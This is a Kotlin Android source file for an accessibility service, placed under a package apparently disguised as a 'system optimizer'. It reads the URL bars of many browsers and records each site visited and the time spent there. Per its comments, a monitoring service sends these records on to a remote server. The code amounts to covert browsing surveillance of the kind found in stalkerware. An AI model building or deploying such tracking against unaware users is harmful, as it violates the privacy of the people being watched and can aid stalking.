package com.system.optimizer.monitor

import android.accessibilityservice.AccessibilityService
import android.accessibilityservice.AccessibilityServiceInfo
import android.util.Log
import android.view.accessibility.AccessibilityEvent
import android.view.accessibility.AccessibilityNodeInfo
import java.net.URI

/**
 * Accessibility Service that monitors browser URL bars to track
 * which websites are visited and for how long.
 *
 * Supports: Chrome, Edge, Firefox, Samsung Internet, Opera, Brave, UC Browser.
 *
 * Sends domain + duration data to MonitoringService via a static callback,
 * which then forwards it to the server over WebSocket.
 */
class BrowserTracker : AccessibilityService() {

    private val TAG = "BrowserTracker"

    // Browser package → URL bar resource ID mappings
    private val browserUrlBarIds = mapOf(
        "com.android.chrome" to "com.android.chrome:id/url_bar",
        "com.chrome.beta" to "com.chrome.beta:id/url_bar",
        "com.chrome.dev" to "com.chrome.dev:id/url_bar",
        "com.chrome.canary" to "com.chrome.canary:id/url_bar",
        "com.microsoft.emmx" to "com.microsoft.emmx:id/url_bar",
        "org.mozilla.firefox" to "org.mozilla.firefox:id/url_bar_title",
        "org.mozilla.firefox_beta" to "org.mozilla.firefox_beta:id/url_bar_title",
        "com.opera.browser" to "com.opera.browser:id/url_field",
        "com.opera.mini.native" to "com.opera.mini.native:id/url_field",
        "com.brave.browser" to "com.brave.browser:id/url_bar",
        "com.sec.android.app.sbrowser" to "com.sec.android.app.sbrowser:id/location_bar_edit_text",
        "com.UCMobile.intl" to "com.UCMobile.intl:id/address_editor_with_security",
        "com.vivaldi.browser" to "com.vivaldi.browser:id/url_bar"
    )

    // All known browser packages (including those without specific URL bar IDs)
    private val allBrowserPackages = browserUrlBarIds.keys + setOf(
        "com.duckduckgo.mobile.android",
        "com.kiwibrowser.browser",
        "org.chromium.chrome"
    )

    // State tracking
    private var currentDomain: String? = null
    private var currentUrl: String? = null
    private var currentBrowserPackage: String? = null
    private var domainStartTime: Long = 0L
    private var lastReportedDomain: String? = null
    private var lastReportedTime: Long = 0L

    // Minimum duration (in ms) before reporting a site visit (avoids noise from quick navigations)
    private val MIN_VISIT_DURATION_MS = 3_000L // 3 seconds
    // Debounce interval to avoid flooding with duplicate events
    private val DEBOUNCE_MS = 1_000L // 1 second

    companion object {
        /**
         * Static callback set by MonitoringService to receive web activity events.
         * Parameters: domain, url, durationSeconds
         */
        @Volatile
        var onWebActivity: ((domain: String, url: String, durationSeconds: Int) -> Unit)? = null
    }

    override fun onServiceConnected() {
        super.onServiceConnected()
        Log.i(TAG, "BrowserTracker AccessibilityService connected")

        // Configure the service programmatically as a backup to XML config
        serviceInfo = serviceInfo?.apply {
            eventTypes = AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED or
                    AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED
            feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC
            flags = AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS or
                    AccessibilityServiceInfo.FLAG_INCLUDE_NOT_IMPORTANT_VIEWS
            notificationTimeout = 300
        }
    }

    override fun onAccessibilityEvent(event: AccessibilityEvent?) {
        if (event == null) return

        val packageName = event.packageName?.toString() ?: return

        // Only process events from known browser apps
        if (packageName !in allBrowserPackages) {
            // If user switched AWAY from a browser, finalize the current visit
            if (currentDomain != null) {
                finalizeCurrentVisit()
            }
            return
        }

        when (event.eventType) {
            AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED -> {
                // Browser came to foreground or changed window
                currentBrowserPackage = packageName
                extractAndTrackUrl(packageName)
            }
            AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED -> {
                // URL bar content may have changed
                if (packageName == currentBrowserPackage) {
                    extractAndTrackUrl(packageName)
                }
            }
        }
    }

    /**
     * Attempt to extract the URL from the browser's URL bar using the
     * known resource ID for the given browser package.
     */
    private fun extractAndTrackUrl(packageName: String) {
        try {
            val rootNode = rootInActiveWindow ?: return

            // Try known URL bar resource ID first
            val urlBarId = browserUrlBarIds[packageName]
            var urlText: String? = null

            if (urlBarId != null) {
                val nodes = rootNode.findAccessibilityNodeInfosByViewId(urlBarId)
                if (!nodes.isNullOrEmpty()) {
                    urlText = nodes[0].text?.toString()
                    nodes.forEach { it.recycle() }
                }
            }

            // Fallback: search for any EditText that looks like a URL bar
            if (urlText.isNullOrBlank()) {
                urlText = findUrlByTraversal(rootNode)
            }

            rootNode.recycle()

            if (!urlText.isNullOrBlank()) {
                processUrl(urlText)
            }
        } catch (e: Exception) {
            // Accessibility tree can be flaky — don't crash
            Log.w(TAG, "Error extracting URL: ${e.message}")
        }
    }

    /**
     * Fallback: walk the accessibility tree looking for an EditText
     * whose content looks like a URL or domain.
     */
    private fun findUrlByTraversal(node: AccessibilityNodeInfo): String? {
        try {
            val text = node.text?.toString()
            if (text != null && node.className?.toString() == "android.widget.EditText") {
                if (text.contains(".") && !text.contains(" ") && text.length > 3) {
                    return text
                }
            }
            for (i in 0 until node.childCount) {
                val child = node.getChild(i) ?: continue
                val result = findUrlByTraversal(child)
                child.recycle()
                if (result != null) return result
            }
        } catch (_: Exception) {}
        return null
    }

    /**
     * Process a raw URL string: normalize it, extract the domain,
     * and track time spent.
     */
    private fun processUrl(rawUrl: String) {
        val domain = extractDomain(rawUrl) ?: return

        // Debounce: ignore rapid-fire duplicate events
        val now = System.currentTimeMillis()
        if (domain == lastReportedDomain && (now - lastReportedTime) < DEBOUNCE_MS) {
            return
        }

        if (domain != currentDomain) {
            // Domain changed — finalize previous visit and start new one
            finalizeCurrentVisit()
            currentDomain = domain
            currentUrl = rawUrl
            domainStartTime = now
            Log.d(TAG, "Now tracking: $domain")
        }
    }

    /**
     * Finalize the current domain visit: calculate duration and report.
     */
    private fun finalizeCurrentVisit() {
        val domain = currentDomain ?: return
        val url = currentUrl ?: domain
        val durationMs = System.currentTimeMillis() - domainStartTime
        val durationSeconds = (durationMs / 1000).toInt()

        if (durationMs >= MIN_VISIT_DURATION_MS) {
            Log.i(TAG, "Visit: $domain — ${durationSeconds}s")
            lastReportedDomain = domain
            lastReportedTime = System.currentTimeMillis()

            try {
                onWebActivity?.invoke(domain, url, durationSeconds)
            } catch (e: Exception) {
                Log.e(TAG, "Error sending web activity: ${e.message}")
            }
        }

        currentDomain = null
        currentUrl = null
        domainStartTime = 0L
    }

    /**
     * Extract the domain from a URL string.
     * Handles both full URLs (https://...) and bare domains (google.com).
     */
    private fun extractDomain(rawUrl: String): String? {
        try {
            val url = if (rawUrl.contains("://")) rawUrl else "https://$rawUrl"
            val uri = URI(url)
            var host = uri.host ?: return null
            // Remove "www." prefix
            if (host.startsWith("www.")) host = host.substring(4)
            // Basic validation
            if (!host.contains(".") || host.length < 4) return null
            return host.lowercase()
        } catch (_: Exception) {
            return null
        }
    }

    override fun onInterrupt() {
        Log.w(TAG, "BrowserTracker interrupted")
        finalizeCurrentVisit()
    }

    override fun onDestroy() {
        finalizeCurrentVisit()
        super.onDestroy()
    }
}
